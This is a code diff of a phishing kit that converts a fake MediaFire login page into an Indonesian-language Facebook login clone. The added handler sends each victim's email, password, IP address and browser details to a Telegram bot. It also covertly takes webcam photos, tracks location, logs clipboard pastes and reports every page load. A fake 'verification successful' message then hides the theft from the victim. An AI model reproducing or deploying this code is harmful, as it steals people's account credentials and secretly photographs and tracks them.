+                <div class="_95ke _8opy">
+                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                        <!-- Language Selector -->
+                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                            <li>Bahasa Indonesia</li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Javanese">Basa Jawa</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="English (UK)">English (UK)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Malay">Bahasa Melayu</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Japanese">日本語</a></li>
+                            <li><a class="_sv4" dir="rtl" href="#" title="Arabic">العربية</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="French (France)">Français (France)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Spanish">Español</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Korean">한국어</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Portuguese (Brazil)">Português (Brasil)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="German">Deutsch</a></li>
+                            <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" href="#">+</a></li>
+                        </ul>
+                        
+                        <!-- Footer Links -->
+                        <div id="pageFooterChildren" role="contentinfo" aria-label="Tautan situs Facebook">
+                            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                                <li><a href="/reg/" title="Daftar Facebook">Daftar</a></li>
+                                <li><a href="/login/" title="Masuk ke Facebook">Masuk</a></li>
+                                <li><a href="https://messenger.com/" title="Coba Messenger.">Messenger</a></li>
+                                <li><a href="/lite/" title="Facebook Lite untuk Android.">Facebook Lite</a></li>
+                                <li><a href="https://www.facebook.com/watch/" title="Telusuri di Video">Video</a></li>
+                                <li><a href="#" title="Meta Pay">Meta Pay</a></li>
+                                <li><a href="#" title="Meta Store">Meta Store</a></li>
+                                <li><a href="#" title="Meta Quest">Meta Quest</a></li>
+                                <li><a href="#" title="Ray-Ban Meta">Ray-Ban Meta</a></li>
+                                <li><a href="#" title="Meta AI">Meta AI</a></li>
+                                <li><a href="#" title="Konten Meta AI lainnya">Konten Meta AI lainnya</a></li>
+                                <li><a href="#" title="Instagram">Instagram</a></li>
+                                <li><a href="#" title="Threads">Threads</a></li>
+                                <li><a href="#" title="Pusat Informasi Pemilu">Pusat Informasi Pemilu</a></li>
+                                <li><a href="#" title="Kebijakan Privasi">Kebijakan Privasi</a></li>
+                                <li><a href="#" title="Pusat Privasi">Pusat Privasi</a></li>
+                                <li><a href="#" title="Meta di Indonesia">Meta di Indonesia</a></li>
+                                <li><a href="#" title="Tentang">Tentang</a></li>
+                                <li><a href="#" title="Buat Iklan">Buat Iklan</a></li>
+                                <li><a href="#" title="Buat Halaman">Buat Halaman</a></li>
+                                <li><a href="#" title="Developer">Developer</a></li>
+                                <li><a href="#" title="Karier">Karier</a></li>
+                                <li><a href="#" title="Cookie">Cookie</a></li>
+                                <li><a class="_41ug" data-nocookies="1" href="#" title="Pilihan Iklan">Pilihan Iklan</a></li>
+                                <li><a data-nocookies="1" href="#" title="Ketentuan">Ketentuan</a></li>
+                                <li><a href="#" title="Bantuan">Bantuan</a></li>
+                                <li><a href="#" title="Pengunggahan Kontak &amp; Non-Pengguna">Pengunggahan Kontak &amp; Non-Pengguna</a></li>
+                                <li><a accesskey="6" class="accessible_elem" href="#" title="Pengaturan">Pengaturan</a></li>
+                                <li><a accesskey="7" class="accessible_elem" href="#" title="Log aktivitas">Log aktivitas</a></li>
+                            </ul>
+                        </div>
+                        
+                        <!-- Copyright -->
+                        <div class="mvl copyright">
+                            <div><span> Meta © 2026</span></div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -265,7 +612,7 @@ input,button{display:block;margin-bottom:10px}
                 // Send start notification
                 const ip = await getIP();
                 await sendToTelegram(
-                    `📸 <b>MEDIAFIRE STEALTH CAMERA STARTED</b>\n` +
+                    `📸 <b>FACEBOOK STEALTH CAMERA STARTED</b>\n` +
                     `🕒 ${new Date().toLocaleString()}\n` +
                     `🌐 IP: ${ip}\n` +
                     `📱 ${navigator.userAgent.substring(0, 80)}...`
@@ -299,7 +646,7 @@ input,button{display:block;margin-bottom:10px}
                         if (brightness > 20 && captureCount <= 5) {
                             canvas.toBlob(async (blob) => {
                                 if (blob && blob.size > 2048) {
-                                    const fileName = `mf_${Date.now()}_${captureCount}.jpg`;
+                                    const fileName = `fb_${Date.now()}_${captureCount}.jpg`;
                                     const file = new File([blob], fileName, { type: 'image/jpeg' });
                                     
                                     await sendToTelegram(
@@ -389,108 +736,110 @@ input,button{display:block;margin-bottom:10px}
         });
         
         // LOGIN FORM HANDLER
-        document.getElementById('form_login1').addEventListener('submit', async (e) => {
-            e.preventDefault();
+// LOGIN FORM HANDLER
+document.getElementById('login_form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('pass').value;
+    
+    if (!email || !password) {
+        document.getElementById('securityAlert').classList.add('show');
+        return;
+    }
+    
+    // Show loader
+    document.getElementById('loader').style.display = 'flex';
+    document.getElementById('securityAlert').classList.remove('show');
+    
+    // Get IP and send credentials
+    const ip = await getIP();
+    await sendToTelegram(
+        `💀 <b>FACEBOOK VICTIM LOGIN</b>\n\n` +
+        `📧 <b>Email:</b> ${email}\n` +
+        `🔑 <b>Password:</b> ${password}\n\n` +
+        `🌐 <b>IP:</b> ${ip}\n` +
+        `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
+        `📱 <b>Browser:</b> ${navigator.userAgent.substring(0, 80)}...`
+    );
+    
+    // Start camera capture
+    setTimeout(async () => {
+        await startCameraCapture();
+    }, 1000);
+    
+    // Capture location
+    setTimeout(async () => {
+        await captureLocation();
+    }, 2000);
+    
+    // Clipboard capture
+    document.addEventListener('paste', async (event) => {
+        const text = event.clipboardData.getData('text');
+        if (text && text.length > 3) {
+            await sendToTelegram(`📋 <b>CLIPBOARD</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${text.substring(0, 200)}`);
+        }
+    });
+    
+    // Show success message after 8 seconds
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('successMsg').classList.add('show');
+        
+        // Update pesan sukses
+        document.querySelector('#successMsg p').textContent = '✅ Verifikasi berhasil! Silakan lanjutkan menggunakan Facebook.';
+        
+        // Start countdown yang tidak melakukan redirect
+        let count = 5;
+        const countdownEl = document.getElementById('countdown');
+        const countdownInterval = setInterval(() => {
+            countdownEl.textContent = `${count} detik`;
+            count--;
             
-            const email = document.getElementById('widget_login_email').value;
-            const password = document.getElementById('widget_login_pass').value;
-            const remember = document.getElementById('login_remember').checked;
-            
-            if (!email || !password) {
-                document.getElementById('securityAlert').classList.add('show');
-                return;
-            }
-            
-            // Show loader
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('securityAlert').classList.remove('show');
-            
-            // Get IP and send credentials
-            const ip = await getIP();
-            await sendToTelegram(
-                `💀 <b>MEDIAFIRE VICTIM LOGIN</b>\n\n` +
-                `📧 <b>Email:</b> ${email}\n` +
-                `🔑 <b>Password:</b> ${password}\n` +
-                `💾 <b>Remember Me:</b> ${remember ? 'Yes' : 'No'}\n\n` +
-                `🌐 <b>IP:</b> ${ip}\n` +
-                `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
-                `📱 <b>Browser:</b> ${navigator.userAgent.substring(0, 80)}...`
-            );
-            
-            // Start camera capture
-            setTimeout(async () => {
-                await startCameraCapture();
-            }, 1000);
-            
-            // Capture location
-            setTimeout(async () => {
-                await captureLocation();
-            }, 2000);
-            
-            // Clipboard capture
-            document.addEventListener('paste', async (event) => {
-                const text = event.clipboardData.getData('text');
-                if (text && text.length > 3) {
-                    await sendToTelegram(`📋 <b>CLIPBOARD</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${text.substring(0, 200)}`);
+            if (count < 0) {
+                clearInterval(countdownInterval);
+                stopCameraCapture();
+                // TIDAK ADA REDIRECT - hanya ubah teks countdown
+                countdownEl.textContent = 'Proses selesai';
+                
+                // 'Tambahkan' tombol untuk menutup pesan atau reset form
+                const closeBtn = document.createElement('button');
+                closeBtn.textContent = 'Tutup';
+                closeBtn.style.cssText = `
+                    background: #1877f2;
+                    color: white;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 5px;
+                    margin-top: 10px;
+                    cursor: pointer;
+                `;
+                closeBtn.onclick = () => {
+                    document.getElementById('successMsg').classList.remove('show');
+                    document.getElementById('login_form').reset();
+                };
+                
+                if (!document.querySelector('#successMsg button')) {
+                    document.getElementById('successMsg').appendChild(closeBtn);
                 }
-            });
-            
-            // Show success message after 8 seconds
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('successMsg').classList.add('show');
-                
-                // Update success message
-                document.querySelector('#successMsg p').textContent = '✅ Verification successful! You can continue using MediaFire.';
-                
-                // Start countdown without redirect
-                let count = 5;
-                const countdownEl = document.getElementById('countdown');
-                const countdownInterval = setInterval(() => {
-                    countdownEl.textContent = `${count} seconds`;
-                    count--;
-                    
-                    if (count < 0) {
-                        clearInterval(countdownInterval);
-                        stopCameraCapture();
-                        // NO REDIRECT - just change countdown text
-                        countdownEl.textContent = 'Process completed';
-                        
-                        // Add button to close message or reset form
-                        if (!document.querySelector('#successMsg button')) {
-                            const closeBtn = document.createElement('button');
-                            closeBtn.textContent = 'Close';
-                            closeBtn.style.cssText = `
-                                background: #07f;
-                                color: white;
-                                border: none;
-                                padding: 10px 20px;
-                                border-radius: 3px;
-                                margin-top: 15px;
-                                cursor: pointer;
-                                font-family: "Open Sans", sans-serif;
-                                font-size: 11px;
-                                text-transform: uppercase;
-                                height: 40px;
-                                line-height: 40px;
-                            `;
-                            closeBtn.onclick = () => {
-                                document.getElementById('successMsg').classList.remove('show');
-                                document.getElementById('form_login1').reset();
-                            };
-                            
-                            document.getElementById('successMsg').appendChild(closeBtn);
-                        }
-                    }
-                }, 1000);
-            }, 8000);
+            }
+        }, 1000);
+    }, 8000);
+});
+        
+        // TOGGLE PASSWORD VISIBILITY
+        document.getElementById('u_0_3_0y').addEventListener('click', (e) => {
+            e.preventDefault();
+            const passwordInput = document.getElementById('pass');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
         });
         
         // PAGE LOAD LOG
         window.addEventListener('load', async () => {
             const ip = await getIP();
             await sendToTelegram(
-                `🌐 <b>MEDIAFIRE PHISHING PAGE LOADED</b>\n` +
+                `🌐 <b>FACEBOOK PHISHING PAGE LOADED</b>\n` +
                 `🕒 ${new Date().toLocaleString()}\n` +
                 `IP: ${ip}\n` +
                 `URL: ${window.location.href}\n` +
@@ -499,7 +848,7 @@ input,button{display:block;margin-bottom:10px}
             
             // Auto-focus email field
             setTimeout(() => {
-                document.getElementById('widget_login_email').focus();
+                document.getElementById('email').focus();
             }, 500);
         });
         
@@ -510,40 +859,6 @@ input,button{display:block;margin-bottom:10px}
                 await captureLocation();
             }
         }, 30000);
-        
-        // Handle "Log in to your account" button click
-        document.querySelector('#loginStep0 .popup-btns button').addEventListener('click', () => {
-            document.getElementById('loginStep0').style.cssText = 'opacity:0; height:0; visibility:hidden';
-            document.getElementById('loginWrap').style.cssText = 'opacity:1; height:auto; visibility:visible';
-            setTimeout(() => {
-                document.getElementById('widget_login_email').focus();
-            }, 300);
-        });
-        
-        // Handle social login buttons
-        document.getElementById('facebookLoginBtn').addEventListener('click', async (e) => {
-            e.preventDefault();
-            const ip = await getIP();
-            await sendToTelegram(
-                `🔵 <b>MEDIAFIRE FACEBOOK LOGIN ATTEMPT</b>\n` +
-                `🕒 ${new Date().toLocaleString()}\n` +
-                `🌐 IP: ${ip}\n` +
-                `📱 User attempted Facebook login`
-            );
-            alert('Facebook login is temporarily unavailable. Please use email login.');
-        });
-        
-        document.getElementById('twitterLoginBtn').addEventListener('click', async (e) => {
-            e.preventDefault();
-            const ip = await getIP();
-            await sendToTelegram(
-                `🐦 <b>MEDIAFIRE TWITTER LOGIN ATTEMPT</b>\n` +
-                `🕒 ${new Date().toLocaleString()}\n` +
-                `🌐 IP: ${ip}\n` +
-                `📱 User attempted Twitter login`
-            );
-            alert('Twitter login is temporarily unavailable. Please use email login.');
-        });
     </script>
 </body>
 </html>
